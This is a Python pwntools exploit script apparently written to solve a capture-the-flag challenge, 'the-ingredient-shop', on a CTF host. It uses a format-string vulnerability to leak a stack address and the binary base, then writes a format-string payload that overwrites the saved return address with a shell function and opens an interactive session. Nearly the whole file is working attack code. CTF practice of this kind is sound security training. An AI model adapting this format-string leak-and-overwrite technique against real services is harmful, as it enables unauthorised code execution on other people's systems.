from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shop"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("the-ingredient-shop-67e51539e17a8c61.challs.brunnerne.xyz", 443, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


shell = 0x00119D

payload = b""
# io.sendline(payload)

ddebug("breakrva 0x129d\n  breakrva 0x1321\n continue")

# fmtstr_payload(8, )
# 43$ ret
io.sendlineafter("exit\n", "--%42$p--%43$p--%15$p")

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
ret_stack = leak - 8
log.success("ret :-----> " + hex(ret_stack))

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
elf.address = leak - 0x1351
shell += elf.address

payload = fmtstr_payload(8, {ret_stack: shell}, write_size="byte")
io.sendlineafter("exit\n", payload)

io.sendline(b"5")

io.interactive()
